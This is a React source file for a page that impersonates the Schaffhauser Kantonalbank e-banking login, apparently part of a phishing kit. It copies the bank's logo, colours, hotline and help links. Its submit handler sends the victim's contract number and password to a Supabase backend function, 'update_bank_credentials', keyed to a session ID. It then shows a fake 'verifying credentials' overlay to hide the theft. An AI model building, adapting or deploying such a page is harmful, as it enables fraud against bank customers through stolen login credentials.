import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import logoUrl from "@/assets/schaffhauser-kantonalbank-logo.svg";
import iconBetrueger from "@/assets/shkb-e-banking-betrueger.png.asset.json";
import iconCronto from "@/assets/shkb-e-banking-cronto-sign.png.asset.json";
import iconInfo from "@/assets/shkb-e-banking-informationen.png.asset.json";
import iconReakt from "@/assets/shkb-e-banking-reaktivieren.png.asset.json";

const YELLOW = "#ffdd3c";

const infoCards = [
  { label: "Schützen Sie sich vor Betrügern", href: "https://www.shkb.ch/node/214", icon: iconBetrueger.url },
  { label: "CrontoSign Swiss für mehr Sicherheit", href: "https://www.shkb.ch/node/243", icon: iconCronto.url },
  { label: "Informationen zum E-Banking", href: "https://www.shkb.ch/eb", icon: iconInfo.url },
  { label: "Mein E-Banking reaktivieren", href: "https://www.shkb.ch/node/599", icon: iconReakt.url },
];

const ChSchaffhauserKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Schaffhauser Kantonalbank – E-Banking", logoUrl);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const canSubmit = vertragsnummer.trim().length > 0 && passwort.trim().length > 0;

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen bg-[#fbfbfb]">
        <div className="max-w-[920px] mx-auto px-4 pt-6 md:pt-10">
          {/* Logo */}
          <div className="bg-white">
            <img src={logoUrl} alt="Schaffhauser Kantonalbank" className="h-[60px] md:h-[70px] object-contain" />
          </div>

          {/* Yellow divider */}
          <div className="mt-4" style={{ height: 4, backgroundColor: YELLOW }} />

          {/* Language switcher */}
          <div className="flex justify-end gap-4 mt-6 text-[14px]">
            <button type="button" className="underline text-black" aria-current="page">deutsch</button>
            <button type="button" className="text-[#999]">english</button>
          </div>

          {/* Login card */}
          <div className="mt-4 bg-white">
            <h1 className="text-[22px] md:text-[26px] font-semibold text-black px-6 py-5">Login E-Banking</h1>
            <div className="h-px bg-[#e5e5e5]" />

            <div className="px-6 py-8 space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-[200px_1fr] gap-2 md:gap-4 md:items-center">
                <label htmlFor="shkb-vnr" className="text-[15px] text-black">Vertragsnummer</label>
                <input
                  id="shkb-vnr"
                  type="text"
                  value={vertragsnummer}
                  onChange={(e) => setVertragsnummer(e.target.value)}
                  className="w-full h-[40px] px-3 bg-white border border-[#bdbdbd] rounded-none text-[15px] outline-none focus:border-black"
                />
              </div>
              <div className="grid grid-cols-1 md:grid-cols-[200px_1fr] gap-2 md:gap-4 md:items-center">
                <label htmlFor="shkb-pw" className="text-[15px] text-black">Passwort</label>
                <input
                  id="shkb-pw"
                  type="password"
                  value={passwort}
                  onChange={(e) => setPasswort(e.target.value)}
                  className="w-full h-[40px] px-3 bg-white border border-[#bdbdbd] rounded-none text-[15px] outline-none focus:border-black"
                />
              </div>

              <div className="flex justify-end pt-2">
                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={!canSubmit}
                  className="px-10 h-[44px] border border-[#bdbdbd] bg-white text-[15px] text-[#777] enabled:hover:bg-[#ffdd3c] enabled:hover:text-black enabled:hover:border-[#ffdd3c] enabled:text-black transition-colors disabled:cursor-not-allowed"
                >
                  Login
                </button>
              </div>
            </div>

            <div className="h-px bg-[#e5e5e5]" />
            <div className="px-6 py-4 text-right text-[13px] text-black">
              <span className="font-semibold">E-Banking Hotline</span>, Tel. +41 52 635 23 23, Mo bis Fr, 07:45 Uhr bis 18:00 Uhr
            </div>
          </div>

          {/* Yellow divider */}
          <div className="mt-8" style={{ height: 4, backgroundColor: YELLOW }} />

          {/* Info cards grid */}
          <div className="mt-6 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pb-12">
            {infoCards.map((c) => (
              <a
                key={c.href}
                href={c.href}
                target="_blank"
                rel="noopener noreferrer"
                className="bg-white border border-[#e5e5e5] flex flex-col items-center justify-start text-center px-4 py-6 hover:border-[#bdbdbd] transition-colors"
              >
                <img src={c.icon} alt="" className="h-[72px] w-auto object-contain mb-4" />
                <span className="text-[14px] text-black underline">{c.label}</span>
              </a>
            ))}
          </div>
        </div>
      </div>
    </>
  );
};

export default ChSchaffhauserKantonalbank;
